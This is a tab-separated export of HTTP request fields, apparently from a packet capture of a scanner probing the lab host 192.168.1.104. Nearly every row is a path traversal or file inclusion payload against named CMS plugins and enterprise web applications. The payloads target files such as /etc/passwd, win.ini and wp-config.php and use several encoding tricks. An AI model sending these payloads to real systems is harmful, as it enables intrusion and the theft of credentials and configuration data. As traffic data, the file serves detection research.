http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_dioneformwizard&controller=../../../../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/index.php?option=com_dioneformwizard&controller=../../../../../../../../../../../../../etc/passwd%00
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-admin/admin-ajax.php?jvfrm_spot_get_json&fn=../../wp-config.php&callback=jQuery		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/wp-admin/admin-ajax.php?jvfrm_spot_get_json&fn=../../wp-config.php&callback=jQuery
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/wp-swimteam/include/user/download.php?file=/etc/passwd&filename=/etc/passwd&contenttype=text/html&transient=1&abspath=/usr/share/wordpress		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36				/web/wp-content/plugins/wp-swimteam/include/user/download.php?file=/etc/passwd&filename=/etc/passwd&contenttype=text/html&transient=1&abspath=/usr/share/wordpress
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36				/web/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/propertyfinder/component/jesectionfinder/?view=../../../../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/propertyfinder/component/jesectionfinder/?view=../../../../../../../../../../../../../etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_canteen&controller=../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36				/web/index.php?option=com_canteen&controller=../../../../../etc/passwd%00
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/?redirect=..%2f..%2f..%2f..%2fwindows/win.ini		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/?redirect=..%2f..%2f..%2f..%2fwindows/win.ini
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/s/25SmlHixpZ5O63a6hC6oebbxPGn/_/%2e/WEB-INF/classes/META-INF/maven/com.atlassian.jira/jira-core/pom.xml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/s/25SmlHixpZ5O63a6hC6oebbxPGn/_/%2e/WEB-INF/classes/META-INF/maven/com.atlassian.jira/jira-core/pom.xml
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/?c=../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36				/web/?c=../../../../../../etc/passwd%00
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/document.php?modulepart=project&file=../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F				/web/document.php?modulepart=project&file=../../../../../../../etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/OA_HTML/jsp/bsc/bscpgraph.jsp?ifl=/etc/&ifn=passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/OA_HTML/jsp/bsc/bscpgraph.jsp?ifl=/etc/&ifn=passwd
	gzip																close		168	168							192.168.1.104														192.168.1.104	1	http://192.168.1.104/web/rest/tinymce/1/macro/preview		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36				/web/rest/tinymce/1/macro/preview
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/s/25SmlHixpZ5O63a6hC6oebbxPGn/_/%2e/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36				/web/s/25SmlHixpZ5O63a6hC6oebbxPGn/_/%2e/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_joomlapicasa2&controller=../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/index.php?option=com_joomlapicasa2&controller=../../../../../etc/passwd%00
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_alphauserpoints&view=../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/index.php?option=com_alphauserpoints&view=../../../../../../../../../../etc/passwd%00
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../c:/windows/win.ini		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../c:/windows/win.ini
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/?page=..%2f..%2f..%2f..%2f..%2fwindows/win.ini		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/?page=..%2f..%2f..%2f..%2f..%2fwindows/win.ini
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/localize-my-post/ajax/include.php?file=../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/wp-content/plugins/localize-my-post/ajax/include.php?file=../../../../../../../../../../etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/wpsite-background-takeover/exports/download.php?filename=../../../../wp-config.php		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/wp-content/plugins/wpsite-background-takeover/exports/download.php?filename=../../../../wp-config.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/mail-masta/inc/lists/csvexport.php?pl=/etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36				/web/wp-content/plugins/mail-masta/inc/lists/csvexport.php?pl=/etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/church-admin/display/download.php?key=../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F				/web/wp-content/plugins/church-admin/display/download.php?key=../../../../../../../etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/downloads/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/downloads/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/webmail/calendar/minimizer/index.php?style=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/webmail/calendar/minimizer/index.php?style=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/phpwiki/index.php/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/phpwiki/index.php/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/?url=..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/?url=..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/badging/badge_print_v0.php?tpl=../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36				/web/badging/badge_print_v0.php?tpl=../../../../../etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/./../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36				/web/./../../../../../../../../../../etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_multiroot&controller=../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/index.php?option=com_multiroot&controller=../../../../../../../../../../etc/passwd%00
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/blog/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36				/web/blog/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/glpi/plugins/barcode/front/send.php?file=../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36				/web/glpi/plugins/barcode/front/send.php?file=../../../../../../../../etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_javoice&view=../../../../../../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/index.php?option=com_javoice&view=../../../../../../../../../../../../../../../etc/passwd%00
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/secureader/javax.faces.resource/web.xml?loc=../WEB-INF		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/secureader/javax.faces.resource/web.xml?loc=../WEB-INF
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/secureader/javax.faces.resource./WEB-INF/web.xml.jsf?ln=..		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36				/web/secureader/javax.faces.resource./WEB-INF/web.xml.jsf?ln=..
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/ajax.php?modname=misc/../../../../../../../../../../../../../etc/passwd&bypass=Transcripts.php		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/ajax.php?modname=misc/../../../../../../../../../../../../../etc/passwd&bypass=Transcripts.php
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/fmangersub?cpath=../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/fmangersub?cpath=../../../../../../../etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/report/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_gadgetfactory&controller=../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36				/web/index.php?option=com_gadgetfactory&controller=../../../../../../../../../../etc/passwd%00
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/Visitor//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows%5Cwin.ini		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/Visitor//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows%5Cwin.ini
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/admin/File/DownloadFile?filePath=wwwroot/..././/..././/..././/..././/..././/..././/..././/..././etc/passwd&delete=0		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/admin/File/DownloadFile?filePath=wwwroot/..././/..././/..././/..././/..././/..././/..././/..././etc/passwd&delete=0
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php		GET				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/webmail/calendar/minimizer/index.php?style=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc%5cpasswd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/webmail/calendar/minimizer/index.php?style=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc%5cpasswd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/lib///....//....//....//....//....//....//....//....//etc//passwd		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36				/web/lib///....//....//....//....//....//....//....//....//etc//passwd
*/*	gzip	en															close		26	26							192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/wp-payeezy-pay/donate.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/wp-content/plugins/wp-payeezy-pay/donate.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/Visitor/bin/WebStrings.srf?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&obj_name=aaa		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36				/web/Visitor/bin/WebStrings.srf?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&obj_name=aaa
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/cgi-bin/Maconomy/MaconomyWS.macx1.W_MCS//etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36				/web/cgi-bin/Maconomy/MaconomyWS.macx1.W_MCS//etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_mtfireeagle&controller=../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36				/web/index.php?option=com_mtfireeagle&controller=../../../../../../../../../../etc/passwd%00
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/diarise/download.php?calendar=file:///etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/wp-content/themes/diarise/download.php?calendar=file:///etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-admin/admin-post.php?alg_wc_pif_download_file=../../../../../wp-config.php		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/wp-admin/admin-post.php?alg_wc_pif_download_file=../../../../../wp-config.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php		GET				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_awdwall&controller=../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36				/web/index.php?option=com_awdwall&controller=../../../../../../../../../../etc/passwd%00
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_pro_desk&include_file=../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36				/web/index.php?option=com_pro_desk&include_file=../../../../../../etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web///////../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web///////../../../etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/issuu-panel/menu/documento/requests/ajax-docs.php?abspath=%2Fetc%2Fpasswd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/wp-content/plugins/issuu-panel/menu/documento/requests/ajax-docs.php?abspath=%2Fetc%2Fpasswd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/static///////../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/static///////../../../../etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_dioneformwizard&controller=../../../../../../../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/index.php?option=com_dioneformwizard&controller=../../../../../../../../../../../../../etc/passwd%00
